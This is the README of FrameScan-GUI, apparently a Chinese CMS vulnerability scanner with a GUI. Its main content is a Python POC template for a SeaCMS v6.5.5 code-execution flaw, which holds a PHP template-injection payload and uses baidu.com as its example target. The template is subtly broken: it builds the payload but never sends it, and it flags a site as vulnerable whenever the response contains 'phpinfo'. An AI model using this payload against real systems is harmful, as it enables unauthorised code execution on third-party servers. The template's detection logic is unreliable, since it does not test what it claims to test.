# FrameScan-GUI

## 工具简介
FrameScan-GUI是一款python3和Pyqt编写的具有图形化界面的cms漏洞检测框架，是[FrameScan](https://github.com/qianxiao996/FrameScan) 的加强版。支持多种检测方式，支持大多数CMS，可以自定义CMS类型及自行编写POC。旨在帮助有安全经验的安全工程师对已知的应用快速发现漏洞。
#### 下载地址：https://github.com/qianxiao996/FrameScan-GUI/releases

## 支持平台

- Windows  


### 使用方法

下载本项目，运行exe即可。

![1](https://github.com/qianxiao996/FrameScan-GUI/blob/master/img/1.jpg)

![2](https://github.com/qianxiao996/FrameScan-GUI/blob/master/img/2.jpg)

## 自定义POC模板

以下为POC模板，请尽量规范编写。脚本中为示例代码。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 漏洞名称（禁止换行）控制在30字以内
referer: 漏洞地址（禁止换行）未知请填unknown
author: 作者名
description: 漏洞描述 
'''
import sys
import requests
import warnings
#方法名称自定义
class seacms_655_code_exec:
    def __init__(self, url):
        self.url = url
    def run(self):
        #此处编辑检测代码
        #示例代码，请更改result内容，result[0]为漏洞名称,result[1]为返回的内容，result[2]为测试结果
        result = ['seacms v6.5.5代码执行漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*"
        url_path = self.url + "/search.php?phpinfo();"
        try:
            data = requests.get(url_path, timeout=3,headers=headers, verify=False)
            if data.status_code == 200 and 'phpinfo' in data.text:
                result[2]= "存在"
                result[1] = "URL:%s\nPOST:%s"%(url_path,payload)
            else:
                result[2] = "不存在"
        except Exception as e:
            # print (e)
            result[2] ="未知"
            #这里可设置未知，连接超时等，只有不存在不会显示到结果中。
        return result
        #最后一定要返回一个带有3个参数的列表。不然会出错误。

if __name__ == "__main__":
    #此处不会调用
    warnings.filterwarnings("ignore")
    testVuln = seacms_655_code_exec("http://baidu.com")
    print(testVuln.run())
```

## 鸣谢

POC多数来源于[AngelSword](https://github.com/Sch01ar/AngelSword)
部分为自己编写，欢迎投递POC

邮箱地址：qianxiao996@126.com

## 警告！
**请勿用于非法用途！否则自行承担一切后果**
